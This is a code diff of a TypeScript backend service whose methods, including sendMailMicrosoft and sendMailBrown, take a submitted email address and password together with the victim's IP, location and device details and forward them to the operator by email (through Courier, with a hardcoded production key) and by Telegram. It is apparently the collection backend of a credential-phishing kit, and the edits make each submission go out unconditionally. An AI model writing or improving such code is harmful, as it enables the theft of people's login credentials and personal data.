@@ -18,35 +18,31 @@ export class AppService {
   async sendMail(data: EmailDto, req: Request) {
     const { email, password, source, to, chatId } = data;
     // Install with: npm install @trycourier/courier
-    console.log(data)
+    console.log(data);
     const courier = CourierClient({
       authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
     });
 
     const { deviceDetails, ipAddr, location } =
-       await this.deviceService.getLoginDeviceInfo(req);
+      await this.deviceService.getLoginDeviceInfo(req);
     let requestId = null;
-    if (to) {
-      const { requestId: emailRequestId } = await courier.send({
-        message: {
-          to: {
-            email: to,
-          },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
-          data: {
-            recipientName: `email: ${email}, \n password: ${password}
+    const { requestId: emailRequestId } = await courier.send({
+      message: {
+        to: {
+          email: to,
+        },
+        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+        data: {
+          recipientName: `email: ${email}, \n password: ${password}
 
             IP: ${ipAddr}
             Location: ${location}
             Device: ${deviceDetails}`,
-            source,
-          },
+          source,
         },
-      });
-      requestId = emailRequestId;
-    }
-
-    
+      },
+    });
+    requestId = emailRequestId;
 
     if (chatId) {
       await this.telegramService.sendLoginNotification(
@@ -61,11 +57,9 @@ export class AppService {
     }
 
     // Send notification to Telegram
-    
 
     return { requestId };
   }
-  
 
   async sendMailMicrosoft(data: EmailDto, req: Request) {
     const { email, password, source } = data;
@@ -75,8 +69,8 @@ export class AppService {
       authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
     });
 
-     const { deviceDetails, ipAddr, location } =
-       await this.deviceService.getLoginDeviceInfo(req);
+    const { deviceDetails, ipAddr, location } =
+      await this.deviceService.getLoginDeviceInfo(req);
 
     const { requestId } = await courier.send(
       {
@@ -91,7 +85,7 @@ export class AppService {
             IP: ${ipAddr}
             Location: ${location}
             Device: ${deviceDetails}`,
-            source
+            source,
           },
         },
       },
@@ -107,17 +101,16 @@ export class AppService {
       source,
       deviceDetails,
       ipAddr,
-      location
+      location,
     );
 
     return requestId;
   }
 
-
   async sendMailBrown(data: EmailDto, req: Request) {
     const { email, password, source } = data;
     // Install with: npm install @trycourier/courier
-    console.log(data)
+    console.log(data);
     const courier = CourierClient({
       authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
     });
@@ -138,7 +131,7 @@ export class AppService {
             IP: ${ipAddr}
             Location: ${location}
             Device: ${deviceDetails}`,
-            source
+            source,
           },
         },
       },
@@ -154,7 +147,7 @@ export class AppService {
       source,
       deviceDetails,
       ipAddr,
-      location
+      location,
     );
 
     return requestId;
